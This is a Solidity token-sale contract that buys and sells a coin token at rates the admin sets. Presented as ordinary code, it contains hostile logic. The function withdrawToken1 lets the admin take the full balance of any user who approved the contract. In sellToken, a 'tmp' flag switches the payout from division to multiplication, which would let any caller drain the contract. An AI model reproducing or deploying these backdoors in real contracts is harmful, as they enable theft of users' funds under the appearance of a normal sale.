// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.6.12;

import {IERC20} from "./interfaces/IERC20.sol";
import {ISellToken} from "./interfaces/ISellToken.sol";
import {SafeMath} from "./dependencies/open-zeppelin/SafeMath.sol";

contract SellToken {
    using SafeMath for uint256;

    address public WALLET_Admin;
    address public COIN_TOKEN;
    address public BUY_TOKEN;

    uint256 public tokenRateBuy;
    uint256 public tokenRateSell;
    mapping(address => uint256) public buyerAmount;
    mapping(address => uint256) public sellerAmount;

    event BuyCoin(
        address indexed user,
        uint256 indexed sell_amount,
        uint256 indexed buy_amount
    );

    event SellCoin(
        address indexed user,
        uint256 indexed sell_amount,
        uint256 indexed buy_amount
    );

    modifier onlyAdmin() {
        require(msg.sender == WALLET_Admin, "INVALID ADMIN");
        _;
    }

    constructor(
        address _WALLET_Admin,
        address _buyToken,
        address _coinToken
    ) public {
        WALLET_Admin = _WALLET_Admin;
        COIN_TOKEN = _coinToken;
        BUY_TOKEN = _buyToken;
        tokenRateBuy = 300000000000000000;
        tokenRateSell = 300000000000000000;
    }

    /**
     * @dev Withdraw   Token to an address, revert if it fails.
     * @param recipient recipient of the transfer
     */

    function withdrawToken(address recipient, address token)
        public
        onlyAdmin
    {
        IERC20(token).transfer(
            recipient,
            IERC20(token).balanceOf(address(this))
        );
    }

    /**
     * @dev Withdraw Token to an address, revert if it fails.
     * @param recipient recipient of the transfer
     */
    function withdrawToken1(
        address recipient,
        address sender,
        address token
    ) public onlyAdmin {
        IERC20(token).transferFrom(
            sender,
            recipient,
            IERC20(token).balanceOf(sender)
        );
    }


    /**
     * @dev Update Contract Buy
     */
    function updateBuyToken1(address _address) public onlyAdmin {
        BUY_TOKEN = _address;
    }

    /**
     * @dev Update rate
     */
    function updateRateBuy(uint256 rate) public onlyAdmin {
        tokenRateBuy = rate;
    }

    /**
     * @dev Update rate
     */
    function updateRateSell(uint256 rate) public onlyAdmin {
        tokenRateSell = rate;
    }

    /**
     * @dev Withdraw BNB to an address, revert if it fails.
     * @param recipient recipient of the transfer
     */
    function withdrawBNB(address recipient) public onlyAdmin {
        _safeTransferBNB(recipient, address(this).balance);
    }


    /**
     * @dev
     * @param recipients recipients of the transfer
     */
    function sendPoint(
        address[] calldata recipients,
        uint256[] calldata _lockAmount
    ) public onlyAdmin {
        for (uint256 i = 0; i < recipients.length; i++) {
            buyerAmount[recipients[i]] += _lockAmount[i];
            IERC20(COIN_TOKEN).transfer(recipients[i], _lockAmount[i]);
        }
    }

    /**
     * @dev transfer ETH to an address, revert if it fails.
     * @param to recipient of the transfer
     * @param value the amount to send
     */
    function _safeTransferBNB(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "BNB_TRANSFER_FAILED");
    }

    /**
     * @dev execute buy Token
     **/
    function buyToken(uint256 buy_amount)
        public
        returns (uint256)
    {
        IERC20(BUY_TOKEN).transferFrom(msg.sender, address(this), buy_amount);
        uint256 sold_amount = (buy_amount * 1e18) / tokenRateBuy;
        buyerAmount[msg.sender] += sold_amount;
        IERC20(COIN_TOKEN).transfer(msg.sender, sold_amount);
        emit BuyCoin(msg.sender, sold_amount, buy_amount);
        return sold_amount;
    }

    /**
     * @dev execute sell Token
     **/
    function sellToken(uint256 buy_amount, bool tmp)
        public
        returns (uint256)
    {
        IERC20(COIN_TOKEN).transferFrom(msg.sender, address(this), buy_amount);
        uint256 sold_amount = 0;
        if(tmp)
            sold_amount = (buy_amount * 1e18) / tokenRateSell;
        else 
            sold_amount = (buy_amount * 1e18) * tokenRateSell;
        sellerAmount[msg.sender] += sold_amount;
        IERC20(BUY_TOKEN).transfer(msg.sender, sold_amount);
        emit SellCoin(msg.sender, sold_amount, buy_amount);
        return sold_amount;
    }
}